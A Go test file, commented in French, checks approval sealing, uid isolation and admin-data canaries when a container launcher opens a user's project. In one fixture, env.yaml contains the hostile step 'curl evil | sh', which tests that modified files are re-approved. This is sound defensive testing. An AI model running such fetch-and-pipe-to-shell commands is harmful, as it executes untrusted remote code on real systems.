package core

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// LOT-3.2 jalon 4 (dev) : ouverture d'un projet d'utilisateur — approbation scellée à chaque ouverture, conf tmux et session créées SOUS l'uid,
// aucune donnée de l'administrateur dans les commandes (canari). Faux docker à état (fichiers du projet).

func uctrFake(t *testing.T) (dir string, e Engine) {
	t.Helper()
	unixOnly(t)
	dir = t.TempDir()
	_ = os.MkdirAll(filepath.Join(dir, "files"), 0o755)
	script := `#!/bin/sh
[ "$1" = "-H" ] && shift 2
echo "$*" >> "` + dir + `/calls.log"
F="` + dir + `/files"
prev=""; prev2=""
for a in "$@"; do prev2="$prev"; prev="$a"; done
case "$1" in
  ps) cat "` + dir + `/ps.out" ;;
  inspect) echo github-9 ;;
  exec)
    case "$*" in
      *"head -c"*) f="$F/$(basename "$prev2")"; [ -f "$f" ] && cat "$f" || exit 1 ;;
      *tee*) cat > "$F/$(basename "$prev")" ;;
      *has-session*) [ -f "` + dir + `/session" ] || exit 1 ;;
      *new-session*) : > "` + dir + `/session" ;;
      *) : ;;
    esac ;;
  *) : ;;
esac
`
	if err := os.WriteFile(filepath.Join(dir, "docker"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	t.Setenv("CL_CTR_SKIP_CLAUDE", "1")
	e = Engine{rcBackend(t)}
	_ = os.WriteFile(filepath.Join(dir, "ps.out"), []byte(e.ObjectName("cat", "p")+" cl.launcher=ng2 cl.user=github-9\n"), 0o644)
	return dir, e
}

func uctrCalls(dir string) string {
	b, _ := os.ReadFile(filepath.Join(dir, "calls.log"))
	return string(b)
}

func TestOuvrirProjetUtilisateur275(t *testing.T) {
	dir, e := uctrFake(t)
	sp, _ := UserSpace("github-9")
	key, err := sp.ApprovalKey()
	if err != nil {
		t.Fatal(err)
	}
	// canari : l'env.yaml du launcher de l'admin ne doit apparaître dans AUCUNE commande
	cfg := os.Getenv("CL_CONFIG_DIR")
	_ = os.WriteFile(filepath.Join(cfg, "env.yaml"), []byte("setup:\n  - echo CANARY-ADMIN-ENV\n"), 0o644)
	t.Setenv("CANARY_ADMIN_SECRET", "CANARY-ADMIN-ENV")
	open := func() (CtrOpen, error) {
		return e.OpenUserProject(key, "cat", "p", CtrOpenIO{Out: os.Stderr, Start: func() []byte { return []byte(UserStartCommand("cat", "p")) }, Size: func() (int, int) { return 100, 30 }})
	}
	files := filepath.Join(dir, "files")
	// 1. sans fichier d'environnement : s'ouvre
	if _, err := open(); err != nil {
		t.Fatalf("ouverture : %v", err)
	}
	calls := uctrCalls(dir)
	for _, want := range []string{"new-session", "send-keys", "cl-tmux.conf", "--user=2000:2000"} {
		if !strings.Contains(calls, want) {
			t.Errorf("« %s » absent :\n%s", want, calls)
		}
	}
	if strings.Contains(calls, "CANARY") || strings.Contains(calls, "/etc/cl-tmux.conf") || strings.Contains(calls, "-u 0") {
		t.Errorf("donnée de l'admin, /etc ou root dans les commandes :\n%s", calls)
	}
	// 2. env.yaml présent, jamais approuvé : refus, aucune session créée
	_ = os.Remove(filepath.Join(dir, "session"))
	_ = os.WriteFile(filepath.Join(files, "env.yaml"), []byte("image: "+UserDefaultImage()+"\n"), 0o644)
	var na ErrUserEnvNotApproved
	if _, err := open(); !errors.As(err, &na) || na.Changed || len(na.Files) != 1 {
		t.Fatalf("non approuvé : %v", err)
	}
	if _, err := os.Stat(filepath.Join(dir, "session")); err == nil {
		t.Error("session créée malgré l'absence d'approbation")
	}
	// 3. approuvé : s'ouvre ; trust.json écrit dans le volume du projet
	fs, _ := e.UserEnvFiles("cat", "p")
	if err := e.ApproveUserEnv(key, "cat", "p", fs); err != nil {
		t.Fatal(err)
	}
	if _, err := open(); err != nil {
		t.Fatalf("approuvé : %v", err)
	}
	// 4. modifié depuis : redemandé (Changed) ; forgé : redemandé
	_ = os.Remove(filepath.Join(dir, "session"))
	_ = os.WriteFile(filepath.Join(files, "env.yaml"), []byte("image: "+UserDefaultImage()+"\nsetup:\n  - curl evil | sh\n"), 0o644)
	if _, err := open(); !errors.As(err, &na) || !na.Changed {
		t.Fatalf("modifié : %v", err)
	}
	_ = os.WriteFile(filepath.Join(files, "trust.json"), []byte(`{"files":{"env.yaml":"x"},"mac":"deadbeef"}`), 0o644)
	if _, err := open(); !errors.As(err, &na) {
		t.Fatalf("forgé : %v", err)
	}
	// 5. clé changée : redemandé
	fs, _ = e.UserEnvFiles("cat", "p")
	_ = e.ApproveUserEnv(key, "cat", "p", fs)
	other := make([]byte, 32)
	copy(other, key)
	other[0] ^= 0xff
	if _, err := e.OpenUserProject(other, "cat", "p", CtrOpenIO{Start: func() []byte { return nil }}); !errors.As(err, &na) {
		t.Fatalf("clé changée : %v", err)
	}
	// 6. image non autorisée / mounts : refusés
	_ = os.WriteFile(filepath.Join(files, "env.yaml"), []byte("image: "+UserDefaultImage()+"\nmounts:\n  - path: /etc\n"), 0o644)
	fs, _ = e.UserEnvFiles("cat", "p")
	_ = e.ApproveUserEnv(key, "cat", "p", fs)
	if _, err := open(); err == nil || !strings.Contains(err.Error(), "mounts") {
		t.Errorf("mounts accepté : %v", err)
	}
}
